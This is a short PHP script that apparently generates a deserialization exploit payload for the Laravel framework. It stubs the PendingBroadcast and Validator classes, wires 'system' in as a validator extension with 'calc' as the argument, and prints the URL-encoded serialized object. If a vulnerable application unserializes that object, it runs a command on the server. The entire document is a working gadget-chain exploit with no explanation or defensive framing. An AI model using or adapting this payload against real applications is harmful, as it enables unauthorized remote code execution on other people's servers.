<?php
namespace Illuminate\Broadcasting{
    class PendingBroadcast{
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}
namespace Illuminate\Validation{
    class Validator{
        public $extensions;
        public function __construct($a){
            $this->extensions = $a;
        }
    }
}

namespace{
    use Illuminate\Broadcasting\PendingBroadcast;
    use Illuminate\Validation\Validator;
    $b = new Validator(array("" => "system"));
    $a = new PendingBroadcast($b, "calc");
    echo urlencode(serialize($a));
}
